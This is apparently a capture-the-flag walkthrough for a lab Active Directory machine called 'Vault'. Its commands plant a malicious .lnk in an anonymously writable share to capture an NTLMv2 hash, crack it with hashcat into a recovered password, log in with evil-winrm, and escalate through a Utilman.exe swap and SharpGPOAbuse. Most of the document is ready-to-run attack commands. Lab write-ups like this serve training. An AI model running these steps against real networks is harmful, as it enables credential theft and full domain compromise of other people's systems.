# Vault: Machine Notes

## Recon

### Nmap
- **AD Ports**: 53, 88, 135, 139, 389, 445, 464, 593, 636, 3268, 3269, 3389, 5985
- **Domain**: `vault.offsec`
- **Host**: `DC`

### SMB Enumeration
- **Null Session Allowed**: `rpcclient -U "" -N 10.10.10.10` (No access to RPC, but SMB works).
- **Shares**: `DocumentsShare` is accessible anonymously.
- **Permissions**: Null user has **Write Access** to `DocumentsShare` (tested by uploading `test.txt`).

---

## Initial Access

### NTLM Capture via Writable Share (.lnk Theft)
1. **Generate Malicious LNK**:
   On Kali:
   ```bash
   python3 ntlm_theft.py -g lnk -s 172.10.10.10 -f vault
   ```
2. **Setup Listener**:
   ```bash
   impacket-smbserver share . -smb2support
   ```
3. **Upload to Target**:
   ```bash
   smbclient //10.10.10.10/DocumentsShare -N
   put vault.lnk
   ```
4. **Capture**: A bot/user browsing the share triggers NTLMv2 authentication.
5. **Cracking**:
   Captured hash for `ANIRUDH`.
   ```bash
   hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
   # Result: SecureHM
   ```

### Initial Shell
- **Evil-WinRM**:
  ```bash
  evil-winrm -i 10.10.10.10 -u ANIRUDH -p SecureHM
  ```

---

## Privilege Escalation

### Method 1: SeRestorePrivilege (Utilman)
1. **Check Privs**: `whoami /priv` shows `SeRestorePrivilege` enabled.
2. **Execution**:
   ```powershell
   cd C:\Windows\System32
   ren Utilman.exe Utilman.old
   copy cmd.exe Utilman.exe
   ```
3. **Trigger**: RDP to host and press **Win + U**.

### Method 2: GPO Abuse (GenericWrite)
1. **BloodHound**: Shows `ANIRUDH` has **GenericWrite** on the `Default Domain Policy`.
2. **Exploit** (SharpGPOAbuse):
   Add the user to the local Administrators group via GPO:
   ```powershell
   .\SharpGPOAbuse.exe --AddLocalAdmin --GPOName "Default Domain Policy" --UserAccount anirudh
   ```
3. **Apply Policy**:
   ```powershell
   gpupdate /force
   ```
4. **Result**: User is now a local administrator.
